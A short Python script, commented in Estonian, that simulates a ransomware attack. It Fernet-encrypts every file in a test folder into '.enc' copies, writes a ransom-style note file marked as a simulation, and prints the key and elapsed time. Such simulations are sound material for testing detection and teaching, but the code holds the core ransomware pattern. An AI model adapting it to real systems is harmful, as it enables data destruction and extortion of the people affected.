from cryptography.fernet import Fernet
from pathlib import Path
import time
import sys

# Kaust, milles asuvad simulatsioonis kasutatavad failid
target_dir = Path("testkaust")

# Genereeritakse üks Fernet võti kogu simulatsiooni jaoks
key = Fernet.generate_key()
fernet = Fernet(key)

# Võetakse kaustast kõik failid, mitte kaustad
files = [p for p in target_dir.iterdir() if p.is_file()]

# Ajastuse algus
start = time.time()

# Krüpteeritakse kõik failid ükshaaval
for file_path in files:
    data = file_path.read_bytes()
    encrypted = fernet.encrypt(data)

    # Uus failinimi saab lõppu .enc
    out_path = file_path.with_suffix(file_path.suffix + ".enc")
    out_path.write_bytes(encrypted)

# Lunamärkme loomine, mis selgitab, et failid on krüpteeritud
note = "Sinu failid on krüpteeritud (simulatsioon)"
(target_dir / "README_RESTORE.txt").write_text(note)

# Ajastuse lõpp
end = time.time()

print("Valmis!")
print("Aeg:", round(end - start, 2), "sekundit")
print("Võti:", key.decode())
